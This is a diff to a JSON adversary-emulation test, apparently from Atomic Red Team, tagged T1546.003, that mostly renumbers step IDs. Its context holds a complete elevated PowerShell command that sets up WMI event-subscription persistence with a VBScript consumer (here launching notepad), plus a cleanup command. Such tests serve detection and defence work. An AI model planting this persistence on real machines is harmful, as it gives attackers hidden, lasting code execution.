@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "4a0da8ec-22d2-4fa7-ba4e-0e4afb4f4961",
+      "id": "dc51fe60-e42a-40d4-89ff-c741e5c286b1",
       "type": "execute-command",
       "data": {
         "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime \u003e= 240 AND TargetInstance.SystemUpTime \u003c 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "c1a5a5f7-041a-48df-80dc-5d0d0eaa6db9",
+      "id": "45c93ae9-8386-44e0-ac54-17544f9d7c28",
       "type": "execute-command",
       "data": {
         "command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject",
@@ -27,18 +27,19 @@
   ],
   "flows": [
     {
-      "s": "4a0da8ec-22d2-4fa7-ba4e-0e4afb4f4961",
+      "s": "dc51fe60-e42a-40d4-89ff-c741e5c286b1",
       "p": "on-success",
-      "o": "c1a5a5f7-041a-48df-80dc-5d0d0eaa6db9"
+      "o": "45c93ae9-8386-44e0-ac54-17544f9d7c28"
     },
     {
-      "s": "4a0da8ec-22d2-4fa7-ba4e-0e4afb4f4961",
+      "s": "dc51fe60-e42a-40d4-89ff-c741e5c286b1",
       "p": "on-failure",
-      "o": "c1a5a5f7-041a-48df-80dc-5d0d0eaa6db9"
+      "o": "45c93ae9-8386-44e0-ac54-17544f9d7c28"
     }
   ],
   "tags": [
     "T1546",
     "T1546.003"
-  ]
+  ],
+  "input_arguments": null
 }
